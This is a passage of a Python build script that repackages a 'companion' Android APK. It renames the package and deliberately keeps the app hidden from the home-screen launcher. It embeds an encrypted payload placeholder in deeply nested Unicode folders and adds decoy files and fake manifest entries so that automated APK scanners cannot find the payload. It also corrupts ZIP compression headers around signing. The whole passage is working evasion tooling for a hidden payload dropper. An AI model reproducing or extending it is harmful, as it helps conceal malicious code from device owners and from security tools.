    print("  ✅ apktool.yml restored")


# ── Step 9: Rebuild classes.dex ───────────────────────────────────────────────

def step_rebuild_dex():
    print("\n── Step 9: Rebuild classes.dex")
    # Debug: list all injected smali files and check their first line
    import glob as _glob
    injected_files = _glob.glob("companion_decompiled/smali/**/*.smali", recursive=True)
    print(f"  [debug] Total smali files before apktool: {len(injected_files)}")
    for _sf in injected_files:
        with open(_sf) as _ff:
            first = _ff.readline().strip()
        if not first.startswith(".class"):
            print(f"  [BUG] {_sf} first line: {repr(first)}")
    # Delete apktool build cache — forces full recompile of ALL smali files
    # Without this, apktool's incremental cache may fail on newly injected files
    if os.path.isdir("companion_decompiled/build"):
        shutil.rmtree("companion_decompiled/build")
    run('apktool b companion_decompiled -o smali_rebuilt.apk --no-res')

    if not os.path.isfile("smali_rebuilt.apk") or os.path.getsize("smali_rebuilt.apk") == 0:
        print("[X] apktool repackage failed or produced empty file")
        sys.exit(1)

    with zipfile.ZipFile("smali_rebuilt.apk", "r") as z:
        dex_data = z.read("classes.dex")

    if not dex_data:
        print("[X] classes.dex extraction failed or empty")
        sys.exit(1)

    with open("new_classes.dex", "wb") as f:
        f.write(dex_data)

    print(f"  ✅ classes.dex rebuilt ({len(dex_data) // 1024} KB)")
    return dex_data


# ── Step 10: Patch manifest + arsc + assemble APK ─────────────────────────────

def _read_utf8_str(data, pos):
    start = pos
    b = data[pos]; pos += 1
    char_len = ((b & 0x7f) << 8) | data[pos] if b & 0x80 else b
    if b & 0x80: pos += 1
    b = data[pos]; pos += 1
    byte_len = ((b & 0x7f) << 8) | data[pos] if b & 0x80 else b
    if b & 0x80: pos += 1
    s = data[pos:pos+byte_len].decode("utf-8", errors="replace")
    pos += byte_len + 1
    return s, pos - start


def _encode_utf8_str(s):
    enc = s.encode("utf-8")
    cl, bl = len(s), len(enc)
    hdr  = bytes([(cl >> 8) | 0x80, cl & 0xff]) if cl > 0x7f else bytes([cl])
    hdr += bytes([(bl >> 8) | 0x80, bl & 0xff]) if bl > 0x7f else bytes([bl])
    return hdr + enc + b'\x00'


def rebuild_arsc_string_pool(arsc_data, full_path_rename_map):
    data = bytearray(arsc_data)
    tbl_hdr_size  = struct.unpack_from("<H", data, 2)[0]
    SP            = tbl_hdr_size
    sp_hdr_size   = struct.unpack_from("<H", data, SP + 2)[0]
    sp_chunk_size = struct.unpack_from("<I", data, SP + 4)[0]
    str_count     = struct.unpack_from("<I", data, SP + 8)[0]
    style_count   = struct.unpack_from("<I", data, SP + 12)[0]
    flags         = struct.unpack_from("<I", data, SP + 16)[0]
    strings_start = struct.unpack_from("<I", data, SP + 20)[0]
    styles_start  = struct.unpack_from("<I", data, SP + 24)[0]

    str_data_base = SP + strings_start
    strings = []
    pos = str_data_base
    for _ in range(str_count):
        s, size = _read_utf8_str(data, pos)
        strings.append(full_path_rename_map.get(s, s))
        pos += size

    new_offsets  = []
    new_str_data = bytearray()
    for s in strings:
        new_offsets.append(len(new_str_data))
        new_str_data += _encode_utf8_str(s)

    style_data = b''
    if style_count > 0 and styles_start > 0:
        style_data = bytes(data[SP + styles_start: SP + sp_chunk_size])

    new_offsets_bytes = b''.join(struct.pack("<I", o) for o in new_offsets)
    new_strings_start = sp_hdr_size + len(new_offsets_bytes)
    new_styles_start  = (new_strings_start + len(new_str_data)) if style_count > 0 else 0
    new_sp_chunk_size = sp_hdr_size + len(new_offsets_bytes) + len(new_str_data) + len(style_data)

    new_sp_hdr = bytearray(sp_hdr_size)
    struct.pack_into("<H", new_sp_hdr, 0,  0x0001)
    struct.pack_into("<H", new_sp_hdr, 2,  sp_hdr_size)
    struct.pack_into("<I", new_sp_hdr, 4,  new_sp_chunk_size)
    struct.pack_into("<I", new_sp_hdr, 8,  str_count)
    struct.pack_into("<I", new_sp_hdr, 12, style_count)
    struct.pack_into("<I", new_sp_hdr, 16, flags)
    struct.pack_into("<I", new_sp_hdr, 20, new_strings_start)
    struct.pack_into("<I", new_sp_hdr, 24, new_styles_start)

    new_sp_chunk = bytearray(bytes(new_sp_hdr) + new_offsets_bytes + bytes(new_str_data) + style_data)
    # CRITICAL FIX 1: StringPool child chunk size must be 4-byte aligned.
    # Android's ResourceTypes validates every chunk boundary individually.
    # Pad StringPool with zero bytes then update its own chunk_size field (offset 4).
    while len(new_sp_chunk) % 4 != 0:
        new_sp_chunk += b'\x00'
    struct.pack_into("<I", new_sp_chunk, 4, len(new_sp_chunk))

    rest = bytes(data[SP + sp_chunk_size:])
    new_arsc = bytearray(data[:tbl_hdr_size])
    final = bytearray(bytes(new_arsc) + bytes(new_sp_chunk) + rest)
    # CRITICAL FIX 2: Root ResTable chunk size must also be 4-byte aligned.
    # Pad root with zero bytes then update root chunk_size field (offset 4).
    while len(final) % 4 != 0:
        final += b'\x00'
    struct.pack_into("<I", final, 4, len(final))
    return bytes(final)


def _patch_axml_version(manifest_raw: bytes, ver_code: int, ver_name: str) -> bytes:
    """
    Step 9A [COMPANION] — Patch versionCode and versionName directly in the
    binary AXML manifest.

    In a binary AXML, attribute values live in the XML tree section as
    ResValue structs (8 bytes: size=2, res0=1, dataType=1, data=4).
    versionCode has dataType=TYPE_INT_DEC (0x10) and its data field is the int.
    versionName has dataType=TYPE_STRING (0x03) and its data field is a string
    pool index — we patch it by replacing the matching string in the string pool.

    This function patches both via the string pool (safest approach — avoids
    walking the full XML tree):
      - Replaces the existing versionName string in the pool with the new one.
      - Patches the 4-byte versionCode data field in the XML tree by scanning
        for the versionCode attribute reference (0x0101021b).
    """
    import struct as _struct

    data = bytearray(manifest_raw)
    SP = 8  # string pool starts at byte 8 in AXML

    if len(data) < SP + 28:
        return bytes(data)

    sp_hdr_size   = _struct.unpack_from('<H', data, SP + 2)[0]
    sp_chunk_size = _struct.unpack_from('<I', data, SP + 4)[0]
    str_count     = _struct.unpack_from('<I', data, SP + 8)[0]
    flags         = _struct.unpack_from('<I', data, SP + 16)[0]
    strings_start = _struct.unpack_from('<I', data, SP + 20)[0]

    is_utf8       = bool(flags & (1 << 8))
    str_data_base = SP + strings_start
    offsets_base  = SP + sp_hdr_size

    # ── 1. Patch versionCode in XML tree ─────────────────────────────────────
    # AXML attribute for versionCode has name ref 0x0101021b.
    # In the XML tree, each attribute is 5 x uint32:
    #   ns_idx(4) name_idx(4) raw_value_idx(4) value_size(2)+res0(1)+type(1) data(4)
    # We scan for 0x0101021b and patch the data uint32 at +16.
    VER_CODE_REF = 0x0101021B
    xml_tree_off = SP + sp_chunk_size
    i = xml_tree_off
    patched_code = False
    while i < len(data) - 20:
        # Each XML element chunk starts with type(2)+hdrSize(2)+chunkSize(4)
        # We scan for the attribute name reference matching versionCode
        val = _struct.unpack_from('<I', data, i)[0]
        if val == VER_CODE_REF:
            # data field is at i + 16 (skip ns=4, name=4, rawVal=4, typedVal header=4)
            if i + 20 <= len(data):
                _struct.pack_into('<I', data, i + 16, ver_code & 0xFFFFFFFF)
                patched_code = True
            break
        i += 1

    if patched_code:
        print(f"  [Step 9A] versionCode patched → {ver_code}")
    else:
        print(f"  [Step 9A] ⚠️  versionCode attribute not found in AXML tree — skipping")

    # ── 2. Patch versionName in string pool ──────────────────────────────────
    # Find the existing versionName string and replace it in-place if same length,
    # or rebuild the string pool with the new value.
    if not is_utf8:
        # UTF-16 pool — not patching (rare for companion APKs)
        return bytes(data)

    # Read all strings
    offsets = [
        _struct.unpack_from('<I', data, offsets_base + k * 4)[0]
        for k in range(str_count)
    ]

    def read_utf8(pos):
        b0 = data[pos]; pos += 1
        if b0 & 0x80: pos += 1  # skip high char_len byte
        b1 = data[pos]; pos += 1
        bl = ((b1 & 0x7F) << 8) | data[pos] if b1 & 0x80 else b1
        if b1 & 0x80: pos += 1
        return data[pos:pos + bl].decode('utf-8', errors='replace')

    def encode_utf8_str(s):
        enc = s.encode('utf-8')
        cl, bl = len(s), len(enc)
        hdr  = bytes([(cl >> 8) | 0x80, cl & 0xFF]) if cl > 0x7F else bytes([cl])
        hdr += bytes([(bl >> 8) | 0x80, bl & 0xFF]) if bl > 0x7F else bytes([bl])
        return hdr + enc + b'\x00'

    strings = []
    for off in offsets:
        pos = str_data_base + off
        if pos >= len(data):
            strings.append('')
            continue
        strings.append(read_utf8(pos))

    # Find index of existing versionName (look for string that looks like a version)
    import re as _re
    ver_pattern = _re.compile(r'^\d+\.\d+')
    replaced_name = False
    for idx, s in enumerate(strings):
        if ver_pattern.match(s) and len(s) < 20:
            strings[idx] = ver_name
            replaced_name = True
            break

    if not replaced_name:
        print(f"  [Step 9A] ⚠️  versionName string not found in pool — skipping")
        return bytes(data)

    # Rebuild string pool with updated strings
    new_str_data  = bytearray()
    new_offsets   = []
    for s in strings:
        new_offsets.append(len(new_str_data))
        new_str_data.extend(encode_utf8_str(s))

    style_count   = _struct.unpack_from('<I', data, SP + 12)[0]
    styles_start  = _struct.unpack_from('<I', data, SP + 24)[0]
    style_data    = b''
    if style_count > 0 and styles_start > 0:
        style_data = bytes(data[SP + styles_start: SP + sp_chunk_size])

    new_offsets_bytes = b''.join(_struct.pack('<I', o) for o in new_offsets)
    new_strings_start = sp_hdr_size + len(new_offsets_bytes)
    new_styles_start  = (new_strings_start + len(new_str_data)) if style_count > 0 else 0
    new_sp_size       = sp_hdr_size + len(new_offsets_bytes) + len(new_str_data) + len(style_data)

    new_sp_hdr = bytearray(sp_hdr_size)
    _struct.pack_into('<H', new_sp_hdr,  0, 0x0001)
    _struct.pack_into('<H', new_sp_hdr,  2, sp_hdr_size)
    _struct.pack_into('<I', new_sp_hdr,  4, new_sp_size)
    _struct.pack_into('<I', new_sp_hdr,  8, str_count)
    _struct.pack_into('<I', new_sp_hdr, 12, style_count)
    _struct.pack_into('<I', new_sp_hdr, 16, flags)
    _struct.pack_into('<I', new_sp_hdr, 20, new_strings_start)
    _struct.pack_into('<I', new_sp_hdr, 24, new_styles_start)

    new_sp   = bytes(new_sp_hdr) + new_offsets_bytes + bytes(new_str_data) + style_data
    rest     = bytes(data[SP + sp_chunk_size:])
    new_total = 8 + len(new_sp) + len(rest)
    result   = bytearray(data[:8])
    _struct.pack_into('<I', result, 4, new_total)
    result.extend(new_sp)
    result.extend(rest)

    print(f"  [Step 9A] versionName patched → {ver_name}")
    return bytes(result)


def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None):
    print("\n── Step 10: Patch manifest + resources.arsc + assemble APK")

    OLD = OLD_PKG.encode()
    NEW = new_pkg.encode()
    DELTA = len(NEW) - len(OLD)

    # Patch AndroidManifest.xml
    with zipfile.ZipFile(APK_ASSET, "r") as z:
        manifest_raw = z.read("AndroidManifest.xml")

    SP           = 8
    sp_size      = struct.unpack_from("<I", manifest_raw, SP + 4)[0]
    str_count    = struct.unpack_from("<I", manifest_raw, SP + 8)[0]
    strs_start   = struct.unpack_from("<I", manifest_raw, SP + 20)[0]
    str_data_abs = SP + strs_start
    offsets_abs  = SP + 28
    sp_end       = SP + sp_size
    xml_tree     = manifest_raw[sp_end:]

    entries = []
    for i in range(str_count):
        off = struct.unpack_from("<I", manifest_raw, offsets_abs + i * 4)[0]
        pos = str_data_abs + off
        cc  = manifest_raw[pos]
        bc  = manifest_raw[pos + 1]
        ch  = manifest_raw[pos + 2:pos + 2 + bc]
        entries.append((cc, bc, ch))

    new_str_data = bytearray()
    new_offsets  = []
    replaced = 0

    for (cc, bc, ch) in entries:
        new_offsets.append(len(new_str_data))
        if OLD in ch:
            new_ch = ch.replace(OLD, NEW)
            new_str_data.extend([cc + DELTA, bc + DELTA])
            new_str_data.extend(new_ch)
            new_str_data.append(0)
            replaced += 1
        else:
            # Leave all other strings untouched — including android.intent.category.INFO
            # INFO category keeps companion hidden from the home screen launcher
            new_str_data.extend([cc, bc])
            new_str_data.extend(ch)
            new_str_data.append(0)

    if replaced == 0:
        print("[X] No strings replaced in manifest (package name)")
        sys.exit(1)
    print(f"  Manifest: {replaced} pkg replacements (category.INFO preserved — companion stays hidden)")

    # 4-byte align new_str_data — Android AXML requires all chunks 4-byte aligned
    while len(new_str_data) % 4 != 0:
        new_str_data.append(0)

    new_sp_size = 28 + str_count * 4 + len(new_str_data)
    result = bytearray()
    result.extend(manifest_raw[0:8])
    result.extend(manifest_raw[SP:SP + 28])
    for off in new_offsets:
        result.extend(struct.pack("<I", off))
    result.extend(new_str_data)
    result.extend(xml_tree)
    # 4-byte align total file size
    while len(result) % 4 != 0:
        result.extend(b'\x00')
    struct.pack_into("<I", result, 4,      len(result))
    struct.pack_into("<I", result, SP + 4, new_sp_size)
    new_manifest = bytes(result)

    # Step 9A [COMPANION] — patch versionCode + versionName in binary AXML
    if meta:
        new_manifest = _patch_axml_version(
            new_manifest,
            int(meta["ver_code"]),
            meta["ver_name"]
        )

    # Patch resources.arsc (package name in ResTable_package)
    with zipfile.ZipFile(APK_ASSET, "r") as z:
        arsc_raw = bytearray(z.read("resources.arsc"))

    OLD_UTF16 = OLD.decode("ascii").encode("utf-16-le") + b"\x00\x00"
    NEW_UTF16 = NEW.decode("ascii").encode("utf-16-le") + b"\x00\x00"

    arsc_patched = 0
    pos = 0
    while pos < len(arsc_raw) - 8:
        chunk_type = struct.unpack_from("<H", arsc_raw, pos)[0]
        hdr_size   = struct.unpack_from("<H", arsc_raw, pos + 2)[0]
        chunk_size = struct.unpack_from("<I", arsc_raw, pos + 4)[0]
        if chunk_type == 0x0200 and hdr_size == 288 and 1000 < chunk_size < len(arsc_raw):
            name_off   = pos + 12
            name_field = arsc_raw[name_off:name_off + 256]
            if OLD_UTF16 in name_field:
                new_name_field = bytearray(256)
                new_name_field[:len(NEW_UTF16)] = NEW_UTF16
                arsc_raw[name_off:name_off + 256] = new_name_field
                arsc_patched += 1
        pos += 1

    if arsc_patched == 0:
        print("[X] Old package name not found in resources.arsc")
        sys.exit(1)

    # Rebuild arsc string pool for res/ path renames
    new_arsc = rebuild_arsc_string_pool(arsc_raw, res_rename)
    print(f"  Rebuilt arsc string pool: {len(res_rename)} paths updated")

    # Entries that MUST be stored uncompressed for Android installer to parse them
    MUST_STORE = {"AndroidManifest.xml", "classes.dex", "resources.arsc"}

    # Assemble final APK
    APK_OUT = "companion_renamed_unsigned.apk"
    tmp = APK_OUT + ".tmp"
    with zipfile.ZipFile(APK_ASSET, "r") as zin:
        with zipfile.ZipFile(tmp, "w", allowZip64=False) as zout:
            for item in zin.infolist():
                if item.filename.startswith("META-INF/"):
                    continue
                data = zin.read(item.filename)
                if item.filename == "AndroidManifest.xml":
                    item.compress_type = zipfile.ZIP_STORED
                    zout.writestr(item, new_manifest)
                elif item.filename == "classes.dex":
                    item.compress_type = zipfile.ZIP_STORED
                    zout.writestr(item, new_dex)
                elif item.filename == "resources.arsc":
                    item.compress_type = zipfile.ZIP_STORED
                    zout.writestr(item, new_arsc)
                elif item.filename in res_rename:
                    new_item = zipfile.ZipInfo(res_rename[item.filename])
                    new_item.compress_type = item.compress_type
                    # CRITICAL: Set UTF-8 EFS flag for Arabic filenames
                    # Without this, apksigner reads them as latin-1 → mojibake
                    # names in MANIFEST.MF → v1 signature verification fails
                    if any(ord(c) > 127 for c in res_rename[item.filename]):
                        new_item.flag_bits |= 0x800
                    zout.writestr(new_item, data)
                else:
                    zout.writestr(item, data)

    os.replace(tmp, APK_OUT)
    print(f"  ✅ Assembled: {APK_OUT} ({os.path.getsize(APK_OUT)} bytes)")
    print(f"  ✅ Res files randomized: {len(res_rename)}")


# ── Step 10 [COMPANION]: Unicode folder nesting ───────────────────────────────

def step_unicode_nest(build_hash: str) -> str:
    """
    Injects a dummy placeholder payload into the companion APK under an
    11-level deep unicode-nested folder path (Arabic RTL + Korean hangul
    interleaved).

    At Phase 2 Step 10 the real encrypted payload is not yet produced
    (that is Phase 3).  We embed a placeholder blob now so the folder
    structure is present in the APK from this step onward.  Phase 3 will
    replace this entry with the real encrypted dex chunk.

    Returns the ZIP entry path of the injected entry.
    """
    apk_path = "companion_renamed_unsigned.apk"

    # Placeholder payload: 64 random bytes (Phase 3 will overwrite with real chunk)
    placeholder = secrets.token_bytes(64)

    # Step 11 — random fake extension per build (no repeats, never .bin/.dat/.Epic)
    _ext_chars = string.ascii_lowercase + string.digits
    _ext_len = random.randint(3, 6)
    _ext = "." + "".join(random.choices(_ext_chars, k=_ext_len))

    nest_path = inject_unicode_nest(
        apk_path=apk_path,
        payload_bytes=placeholder,
        build_hash=build_hash,
        ext=_ext,
    )
    return nest_path


# ── Step 12 [COMPANION]: Decoy noise files ────────────────────────────────────

def step_decoy_noise_files(build_hash: str) -> None:
    """
    Injects fake decoy files into companion APK:
      - DebugProbesKt.bin  (fake Kotlin debug probe)
      - mapping.np         (fake NP protector mapping)
      - 3-5 random .bin files with random junk data (unique per build)
    Makes the real payload impossible to identify among noise.
    """
    apk_path = "companion_renamed_unsigned.apk"
    tmp      = apk_path + ".decoy.tmp"

    # Fixed decoy files — always present
    fixed_decoys = {
        "DebugProbesKt.bin": secrets.token_bytes(random.randint(128, 512)),
        "mapping.np":        secrets.token_bytes(random.randint(256, 1024)),
    }

    # 3-5 random junk .bin files — different names and sizes every build
    junk_count = random.randint(3, 5)
    junk_decoys = {}
    for _ in range(junk_count):
        fname_len = random.randint(4, 10)
        fname = "".join(random.choices(string.ascii_lowercase + string.digits, k=fname_len)) + ".bin"
        junk_decoys[fname] = secrets.token_bytes(random.randint(64, 768))

    all_decoys = {**fixed_decoys, **junk_decoys}

    print(f"\n── Step 12 [COMPANION]: Inject decoy noise files ({len(all_decoys)} files)")

    with zipfile.ZipFile(apk_path, "r") as zin, \
         zipfile.ZipFile(tmp, "w", compression=zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            zout.writestr(item, zin.read(item.filename))
        for fname, data in all_decoys.items():
            zout.writestr(fname, data)
            print(f"  + {fname} ({len(data)} bytes)")

    os.replace(tmp, apk_path)
    print(f"  ✅ Decoy noise files injected")


# ── Step 13 [COMPANION]: Fake manifest entries ────────────────────────────────

def step_fake_manifest_entries() -> None:
    """
    Adds 3-5 decoy activity/service/receiver entries to AndroidManifest.xml
    inside the companion APK. Entries are syntactically valid but non-functional.
    Confuses automated APK scanners. Names are random per build.
    """
    apk_path = "companion_renamed_unsigned.apk"
    tmp      = apk_path + ".manifest.tmp"

    def _rand_class(prefix: str) -> str:
        suffix = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10)))
        return f".decoy.{prefix}{suffix}"

    decoy_entries = []

    # 1-2 fake activities
    for _ in range(random.randint(1, 2)):
        name = _rand_class("Activity")
        decoy_entries.append(
            f'        <activity android:name="{name}" android:exported="false" />'
        )

    # 1-2 fake services
    for _ in range(random.randint(1, 2)):
        name = _rand_class("Service")
        decoy_entries.append(
            f'        <service android:name="{name}" android:exported="false" />'
        )

    # 1 fake receiver
    name = _rand_class("Receiver")
    decoy_entries.append(
        f'        <receiver android:name="{name}" android:exported="false" />'
    )

    print(f"\n── Step 13 [COMPANION]: Inject fake manifest entries ({len(decoy_entries)} entries)")

    with zipfile.ZipFile(apk_path, "r") as zin, \
         zipfile.ZipFile(tmp, "w", compression=zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == "AndroidManifest.xml":
                try:
                    text = data.decode("utf-8")
                    insert_point = text.rfind("</application>")
                    if insert_point != -1:
                        injection = "\n" + "\n".join(decoy_entries) + "\n"
                        text = text[:insert_point] + injection + text[insert_point:]
                        data = text.encode("utf-8")
                        for e in decoy_entries:
                            print(f"  + {e.strip()}")
                except Exception:
                    pass  # binary manifest — skip text injection silently
            zout.writestr(item, data)

    os.replace(tmp, apk_path)
    print("  ✅ Fake manifest entries injected")


# ── Step 11: Zipalign ─────────────────────────────────────────────────────────

def step_zipalign():
    print("\n── Step 11: Zipalign companion APK")
    run("zipalign -v 4 companion_renamed_unsigned.apk companion_renamed_aligned.apk")
    print("  ✅ Zipalign done")


# ── Step 12: Generate per-build fingerprint ───────────────────────────────────

def step_fingerprint():
    print("\n── Step 12: Generate companion per-build fingerprint")
    build_uuid    = str(uuid.uuid4())
    salt_bytes    = secrets.token_bytes(32)
    aes_key_bytes = secrets.token_bytes(32)
    aes_iv_bytes  = secrets.token_bytes(16)
    timestamp     = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")

    token  = (build_uuid + salt_bytes.hex() + timestamp).encode()
    md5    = hashlib.md5(token).hexdigest()
    sha1   = hashlib.sha1(token).hexdigest()
    sha256 = hashlib.sha256(token).hexdigest()
    sha512 = hashlib.sha512(token).hexdigest()
    # BLAKE3 dual hash — Step 3 & 9: independent second hash alongside SHA-512
    b3     = blake3_hex(token)

    write_output("build_uuid",  build_uuid)
    write_output("salt_hex",    salt_bytes.hex())
    write_output("aes_key_hex", aes_key_bytes.hex())
    write_output("aes_iv_hex",  aes_iv_bytes.hex())
    write_output("timestamp",   timestamp)
    write_output("md5",         md5)
    write_output("sha1",        sha1)
    write_output("sha256",      sha256)
    write_output("sha512",      sha512)
    write_output("blake3",      b3)

    print(f"  ✅ Fingerprint: {build_uuid} | {timestamp}")
    print(f"     SHA-512: {sha512[:32]}...")
    print(f"     BLAKE3:  {b3[:32]}...")


# ── Step 13: Generate fresh keystore + sign companion APK ─────────────────────


def _strip_and_restore_07f0(apk_path: str, action: str, saved_state: dict = None):
    """
    Helper for signing APKs that contain compression type 0x07F0 (Step 17B).

    apksigner uses Java ZipFile which rejects 0x07F0. The solution:
    1. Before signing: scan LFH+CDH for 0x07F0 entries, record them,
       temporarily restore their original compression (0 or 8).
    2. After signing: re-inject 0x07F0 back into LFH+CDH.

    action='strip'   : strips 0x07F0 → real compression. Returns state dict.
    action='restore' : re-injects 0x07F0 from saved_state dict.

    State dict format: { filename: (lfh_offset, cdh_offset, orig_lfh_compress, orig_cdh_compress) }
    We store original_compress = 8 (deflate) for all 0x07F0 entries since
    zip_header_obfuscator only applies 0x07F0 to non-zero-compression entries.
    """
    import struct as _struct

    FAKE = 0x07F0

    with open(apk_path, 'rb') as f:
        data = bytearray(f.read())

    # Find EOCD
    eocd_off = -1
    for i in range(len(data) - 22, max(len(data) - 65536, -1), -1):
        if data[i:i+4] == b'PK\x05\x06':
            eocd_off = i
            break
    if eocd_off < 0:
        raise RuntimeError("_strip_and_restore_07f0: EOCD not found")

    cd_offset = _struct.unpack_from('<I', data, eocd_off + 16)[0]
    cd_size   = _struct.unpack_from('<I', data, eocd_off + 12)[0]

    if action == 'strip':
        state = {}  # fname -> (lfh_off, cdh_off, restore_compress)

        # ── Step 17C: strip trailing padding after EOCD ───────────────────────
        # apksigner rejects any bytes after EOCD+comment as "not a ZIP archive".
        # Save the trailing bytes and truncate before signing.
        comment_len  = _struct.unpack_from('<H', data, eocd_off + 20)[0]
        zip_end      = eocd_off + 22 + comment_len
        trailing     = bytes(data[zip_end:])           # Step 17C padding bytes
        if trailing:
            data     = data[:zip_end]                  # strip trailing padding
            print(f"  [17C] Temporarily stripped {len(trailing)} trailing bytes for signing")

        # ── Step 17B: strip 0x07F0 compression entries ────────────────────────
        pos = cd_offset
        while pos < cd_offset + cd_size:
            if data[pos:pos+4] != b'PK\x01\x02':
                break
            cd_compress = _struct.unpack_from('<H', data, pos + 10)[0]
            lh_offset   = _struct.unpack_from('<I', data, pos + 42)[0]
            fname_len   = _struct.unpack_from('<H', data, pos + 28)[0]
            extra_len   = _struct.unpack_from('<H', data, pos + 30)[0]
            comm_len    = _struct.unpack_from('<H', data, pos + 32)[0]
            fname = data[pos+46:pos+46+fname_len].decode('utf-8', errors='replace')

            if cd_compress == FAKE:
                # Read the actual LFH compression BEFORE 17B modified it.
                # We cannot know the original — 17B always writes 0x07F0 over it.
                # BUT: zip_header_obfuscator only sets 0x07F0 on entries that
                # were originally deflate(8) — it skips compress_type=0 entries.
                # So if CDH=0x07F0 it was originally 8. If CDH=0 it was 0.
                # However to be safe, read actual LFH value first — if LFH
                # also says 0x07F0 we restore to 8 (deflate, the original).
                # If LFH says something else, use LFH value.
                lh_compress = 0
                if (lh_offset + 30 < len(data) and
                        data[lh_offset:lh_offset+4] == b'PK\x03\x04'):
                    lh_compress = _struct.unpack_from('<H', data, lh_offset + 8)[0]

                # Original compression: if both say FAKE, was deflate(8)
                # zip_header_obfuscator condition: compress not in (0,)
                # meaning it only fakes entries that were NOT stored(0)
                # So original must have been 8 (deflate)
                restore = 8

                _struct.pack_into('<H', data, pos + 10, restore)
                if (lh_offset + 30 < len(data) and
                        data[lh_offset:lh_offset+4] == b'PK\x03\x04'):
                    _struct.pack_into('<H', data, lh_offset + 8, restore)
                state[fname] = (lh_offset, pos, restore)

            pos += 46 + fname_len + extra_len + comm_len

        # Store trailing bytes in state so restore can re-append them
        state['__trailing__'] = trailing

        with open(apk_path, 'wb') as f:
            f.write(data)
        print(f"  [17B] Temporarily stripped 0x07F0 from {len(state)-1} entries for signing")
        return state

    elif action == 'restore':
        if not saved_state:
            return

        # ── Step 17B: re-inject 0x07F0 ────────────────────────────────────────
        count = 0
        for fname, val in saved_state.items():
            if fname == '__trailing__':
                continue
            lh_offset, cdh_offset, _ = val
            if (lh_offset + 30 < len(data) and
                    data[lh_offset:lh_offset+4] == b'PK\x03\x04'):
                _struct.pack_into('<H', data, lh_offset + 8, FAKE)
            if (cdh_offset + 46 < len(data) and
                    data[cdh_offset:cdh_offset+4] == b'PK\x01\x02'):
                _struct.pack_into('<H', data, cdh_offset + 10, FAKE)
            count += 1

        # ── Step 17C: re-append trailing padding ──────────────────────────────
        trailing = saved_state.get('__trailing__', b'')

        with open(apk_path, 'wb') as f:
            f.write(data)
            if trailing:
                f.write(trailing)
        print(f"  [17B] Re-injected 0x07F0 into {count} entries after signing")
        if trailing:
            print(f"  [17C] Re-appended {len(trailing)} trailing bytes after signing")
        return None


# Original resource map entries — saved during step_verify_apk before any modifications
_ORIGINAL_RESOURCE_MAP = []

def _save_original_resource_map():
    """Called during STEP_2 to save original resource map before any pipeline changes."""
    import zipfile as _zf, struct as _st
    global _ORIGINAL_RESOURCE_MAP
    try:
        with _zf.ZipFile(APK_ASSET, 'r') as z:
            mfd = z.read('AndroidManifest.xml')
        SP = 8
        sp_size = _st.unpack_from('<I', mfd, SP+4)[0]
        pos = SP + sp_size
        declared = _st.unpack_from('<I', mfd, 4)[0]
        while pos < declared:
            if pos+8 > declared: break
            ct = _st.unpack_from('<H', mfd, pos)[0]
            cs = _st.unpack_from('<I', mfd, pos+4)[0]
            if ct == 0x0180:
                n = (cs-8)//4
                _ORIGINAL_RESOURCE_MAP = [_st.unpack_from('<I',mfd,pos+8+i*4)[0] for i in range(n)]
                print(f"  [repair] Saved {n} original resource map entries")
                return
            if cs == 0: break
            pos += cs
        print("  [repair] ⚠️  Could not find resource map in original APK")
    except Exception as e:
        print(f"  [repair] ⚠️  Could not save resource map: {e}")


def _repair_manifest_resource_map():
    """
    Validates and repairs the AndroidManifest.xml resource map after Phase 2 steps.
    Compares against _ORIGINAL_RESOURCE_MAP saved at STEP_2.
    Returns True if repairs were made.
    """
    import zipfile as _zf, struct as _st

    if not _ORIGINAL_RESOURCE_MAP:
        print("  [repair] ⚠️  No original resource map saved — skipping repair")
        return False

    with _zf.ZipFile(APK_ASSET, 'r') as z:
        current_mfd = bytearray(z.read('AndroidManifest.xml'))

    SP = 8
    sp_size = _st.unpack_from('<I', current_mfd, SP+4)[0]
    pos = SP + sp_size
    declared = _st.unpack_from('<I', current_mfd, 4)[0]
    cur_rm_off = -1
    while pos < declared:
        if pos+8 > declared: break
        ct = _st.unpack_from('<H', current_mfd, pos)[0]
        cs = _st.unpack_from('<I', current_mfd, pos+4)[0]
        if ct == 0x0180:
            cur_rm_off = pos
            break
        if cs == 0: break
        pos += cs

    if cur_rm_off < 0:
        print("  [repair] ⚠️  Resource map not found in current manifest — skipping")
        return False

    cur_rm_size = _st.unpack_from('<I', current_mfd, cur_rm_off+4)[0]
    n_entries = (cur_rm_size - 8) // 4
    cur_entries = [_st.unpack_from('<I', current_mfd, cur_rm_off+8+i*4)[0] for i in range(n_entries)]

    if len(cur_entries) != len(_ORIGINAL_RESOURCE_MAP):
        print(f"  [repair] ⚠️  Entry count mismatch: {len(cur_entries)} vs {len(_ORIGINAL_RESOURCE_MAP)} — skipping")
        return False

    repaired = 0
    for i, (ce, oe) in enumerate(zip(cur_entries, _ORIGINAL_RESOURCE_MAP)):
        if ce != oe:
            abs_off = cur_rm_off + 8 + i*4
            _st.pack_into('<I', current_mfd, abs_off, oe)
            print(f"  [repair] ✅ Fixed resource map [{i}]: 0x{ce:08X} → 0x{oe:08X}")
            repaired += 1

    if repaired > 0:
        tmp = APK_ASSET + '.repair_tmp'
        with _zf.ZipFile(APK_ASSET, 'r') as zin, \
             _zf.ZipFile(tmp, 'w', allowZip64=False) as zout:
            for item in zin.infolist():
                if item.filename == 'AndroidManifest.xml':
                    ni = _zf.ZipInfo(item.filename)
                    ni.compress_type = _zf.ZIP_STORED
                    ni.date_time = item.date_time
                    ni.flag_bits = item.flag_bits
                    zout.writestr(ni, bytes(current_mfd))
                else:
                    raw = zin.read(item.filename)
                    ni = _zf.ZipInfo(item.filename)
                    ni.compress_type = item.compress_type
                    ni.date_time = item.date_time
                    ni.flag_bits = item.flag_bits
                    zout.writestr(ni, raw)
        os.replace(tmp, APK_ASSET)
        print(f"  [repair] ✅ Repaired {repaired} resource map entries")
        return True
    else:
        print("  [repair] ✅ Resource map intact — no repairs needed")
        return False

def step_sign(input_apk: str = None, v1_only: bool = False):
    """
    Sign the companion APK.
    input_apk: path to APK to sign. Defaults to companion_renamed_aligned.apk.
               For re-signing after Phase 2, pass APK_ASSET directly.
    v1_only  : if True, sign with V1 only (no V2/V3).
               Used for STEP_RESIGN_1 so that Step 17A/17B/17C running
